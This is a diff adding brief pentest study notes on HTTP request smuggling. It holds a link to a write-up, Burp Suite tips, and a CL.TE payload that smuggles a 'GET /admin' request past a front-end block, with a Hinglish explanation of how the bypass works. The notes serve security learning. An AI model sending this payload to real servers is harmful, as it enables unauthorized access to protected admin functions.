@@ -1,0 +1,51 @@
+
+
+-----------------------------------------------write ups    -------------------------------------------
+https://blog.cobalt.io/a-pentesters-guide-to-http-request-smuggling-8b7bf0db1f0
+
+
+
+
+-------------------------------------------------end-----------------------------------------------------
+
+
+
+
+How to detect it?
+This vulnerability can be detected manually with the guide given below or by using Burp Suite’s smuggler extension. Manual exploitation and detection steps are given below. Please refer to the last section “Portswigger — Automation” of the HTTP Request Smuggling video for more information.
+
+
+
+
+Couple of tips before starting the exploitation:
+Include \r\n\r\n following final 0
+Go to Burp Repeater menu and uncheck “Update Content-Length” option
+
+payloads 
+
+POST / HTTP/1.1
+Host : software-vendor.com
+Content-Length : 200
+Transfer-Encoding : chunked
+
+0
+
+GET /admin HTTP/1.1
+Host:software-vendor.com
+x:x
+
+
+samjo admin page pe frontend se block laga he 
+http request smuggling se frontend ko lagega ek hi request he par backend me 2 alag alag request ho jata he or grant mil jayega
+
+
+
+
+
+
+
+
+
+
+
+
